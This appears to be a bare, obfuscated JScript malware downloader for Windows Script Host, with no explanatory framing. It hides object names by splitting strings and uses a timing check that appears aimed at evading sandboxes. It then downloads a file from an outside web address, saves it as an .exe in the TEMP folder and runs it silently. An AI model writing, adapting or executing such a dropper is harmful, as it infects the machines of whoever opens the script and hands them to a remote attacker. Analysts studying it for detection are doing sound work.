var NS = false;
var T = "Create"+"Object";
var BJ = function L() {return WScript[T]("WScript"+".Shell");}(), NC = 11;
var R = "MSXML2"+".XMLHTTP";
var R0 = 2;
var DL = R0 - 2;
function HN(QP){BJ["Run"](QP, DL, DL);};
function V(){return R + "";};
function X(O, DU){DL = DL * 1; return O - DU;};
function EJ(){return T;};
/*@cc_on
  @if (@_win32 || @_win64)
    NS = true;
  @end
@*/
if (NS)
{
var MJ = "";
function YF(){return 22;};
var FW = 0; var N = 0;
function L0()
{
var XI = new this["Date"]();
var HD = XI["getUTCMilliseconds"]();
WScript["Sleep"](YF());
var XI = new this["Date"]();
var S = XI["getUTCMilliseconds"]();
WScript["Sleep"](YF());
var XI = new this["Date"]();
var I0 = XI["getUTCMilliseconds"]();
var FW = "A";
FW = X(S, HD);
var N = "JR";
N = X(I0, S);
MJ = "open";
return X(FW, N);
}
var LC = false;
var HG = false;
for (var AY = DL; AY < YF() * 1; AY++){if (L0() != DL){
LC = true; 
N = "31" + 11 * FW + N; 
HG = true; 
break;
}}
function XO() {return ((LC == true) && (LC == HG)) ? 1 : DL;};
if (LC && XO() && HG){
function LW() {return BJ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "JcUMkqVSDuJhBWq.ex" + "e";};
 K = V();
 S0 = WScript[T](K);
 var TA = 1;
do { 
	for (;TA;){
	try {
		if (TA == 1)
		{
			S0[MJ]("GET", "http://beimeihuifu.com/n7dja", false);
			S0["send"]();
			JF = "Sleep";
			TA = 2;
		}
		WScript[JF](YF() + 120); 
		if (S0["readystate"] < 2 * 2) continue;
		TA = DL;
		function I(Y) {var P = (1, 2, 3, 4, 5, Y); return P;};
		OK = WScript[EJ()]("ADODB.Stream");
		K = OK;
		K[MJ]();
		K["type"] = I(1);
		K["write"](S0["ResponseBody"]);
		OK["position"] = I(DL);
		K["Save" + "ToFile"](LW(), 2);
		OK["cl"+"ose"]();
		UQ = LW();
		HN(UQ);
	} catch(JE){};};
}while (TA);
}
}

